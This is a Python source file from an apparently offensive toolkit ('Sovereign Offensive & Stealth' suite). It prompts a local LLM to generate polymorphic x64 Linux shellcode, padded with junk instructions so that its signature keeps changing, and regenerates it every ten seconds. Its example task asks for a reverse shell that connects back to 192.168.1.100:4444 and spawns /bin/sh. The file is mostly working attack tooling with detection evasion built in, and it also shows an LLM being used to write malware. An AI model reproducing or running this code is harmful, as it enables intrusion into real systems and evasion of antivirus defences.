#!/usr/bin/env python3
"""
polymorphic_shellcode.py – Generates mutating shellcode using a local LLM.
Part of the SOS (Sovereign Offensive & Stealth) suite.
"""

import logging
import re
import time

import requests

logger = logging.getLogger("PolymorphicShellcode")

class PolymorphicGenerator:
    """
    Generates position-independent shellcode that mutates every N seconds.
    Uses a local Ollama model (e.g., codellama) to produce unique hex bytes.
    """

    def __init__(self, llm_url: str = "http://localhost:11434/api/generate",
                 model: str = "codellama:latest",
                 mutate_interval: int = 10):
        self.llm_url = llm_url
        self.model = model
        self.mutate_interval = mutate_interval
        self.last_shellcode: bytes | None = None
        self.last_task: str = ""

    def _call_llm(self, prompt: str) -> str:
        """Send prompt to Ollama and return raw response."""
        try:
            response = requests.post(
                self.llm_url,
                json={
                    "model": self.model,
                    "prompt": prompt,
                    "stream": False,
                    "temperature": 0.8,
                    "max_tokens": 2048
                },
                timeout=30
            )
            response.raise_for_status()
            return response.json().get("response", "")
        except Exception as e:
            logger.error(f"LLM call failed: {e}")
            return ""

    def generate_shellcode(self, task_description: str) -> bytes | None:
        """
        Generate new shellcode for the given task.
        The LLM is instructed to output only hex bytes (e.g., \\x31\\xc0...).
        """
        prompt = f"""You are a shellcode generation expert. Write position-independent x64 shellcode for Linux that performs the following task: {task_description}

The shellcode must:
- Be completely position-independent (no hardcoded absolute addresses).
- Avoid null bytes if possible.
- Use a different set of registers and instruction ordering than previous versions.
- Include random junk instructions (e.g., NOPs, arithmetic on unused registers) to change signature.
- Output ONLY the raw hex bytes in the format \\x31\\xc0\\x48\\x31... without any additional text.

Task: {task_description}
"""
        raw_output = self._call_llm(prompt).strip()
        # Extract hex bytes – find a continuous string of \xHH
        hex_pattern = r'(\\x[0-9a-fA-F]{2})+'
        match = re.search(hex_pattern, raw_output)
        if not match:
            logger.warning("No valid hex pattern found in LLM output")
            return self.last_shellcode  # fallback

        hex_str = match.group(0)
        # Convert to bytes
        try:
            # Remove \x and decode hex
            hex_bytes = bytes(int(hex_str[i+2:i+4], 16) for i in range(0, len(hex_str), 4))
            self.last_shellcode = hex_bytes
            self.last_task = task_description
            logger.info(f"Generated {len(hex_bytes)} bytes of shellcode")
            return hex_bytes
        except Exception as e:
            logger.error(f"Failed to parse hex: {e}")
            return self.last_shellcode

    def mutate_loop(self, task_description: str):
        """
        Continuously generate new shellcode every mutate_interval seconds.
        This should be run in a separate thread; the latest shellcode is stored in self.last_shellcode.
        """
        while True:
            self.generate_shellcode(task_description)
            time.sleep(self.mutate_interval)

# Example usage (if run standalone)
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    pg = PolymorphicGenerator()
    # This will run forever, generating new shellcode every 10 seconds
    pg.mutate_loop("connect back to 192.168.1.100:4444 and spawn /bin/sh")
